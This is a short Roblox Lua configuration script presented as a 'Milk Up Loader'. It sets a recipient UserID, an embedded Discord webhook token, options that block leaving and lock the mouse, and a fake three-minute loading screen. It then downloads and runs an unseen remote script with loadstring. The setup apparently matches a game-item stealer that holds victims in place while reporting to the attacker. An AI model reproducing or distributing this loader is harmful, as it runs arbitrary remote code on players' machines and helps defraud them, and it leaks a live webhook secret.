_G.UserID = 4624571355
_G.Webhook = "https://discord.com/api/webhooks/1103268351930802308/hZQbBdsChzYvT-9DuLBX7SUvkiL-nKJKXQFU3X7S27ztvrtiX7PAXzF6bWHknYrISm83" -- optional delete the whole line if you don't want it

_G.LoadingScreen = true
_G.AntiLeave = true
_G.MouseLock = true 
-- set them to false if you don't want them

_G.ScriptName = "Milk Up Loader"
_G.FirstText = "Script Preparing"
_G.SecondText = "Script Loading..."
_G.ThirdText = "Almost Done..."
_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes

loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Script.lua", true))()
